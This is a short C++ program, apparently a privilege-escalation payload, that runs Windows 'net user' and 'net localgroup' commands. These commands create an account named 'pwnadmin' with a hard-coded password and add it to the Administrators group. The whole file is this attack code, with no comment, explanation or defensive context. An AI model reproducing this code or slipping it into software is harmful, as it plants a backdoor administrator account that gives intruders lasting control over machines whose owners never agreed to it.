#include <cstdlib>
#include <iostream>

using namespace std;

int main(int argc, char *argv[])
{
    system("net user /add pwnadmin P@ssw0rd!23");
    system("net localgroup /add Administrators pwnadmin");
    return EXIT_SUCCESS;
}
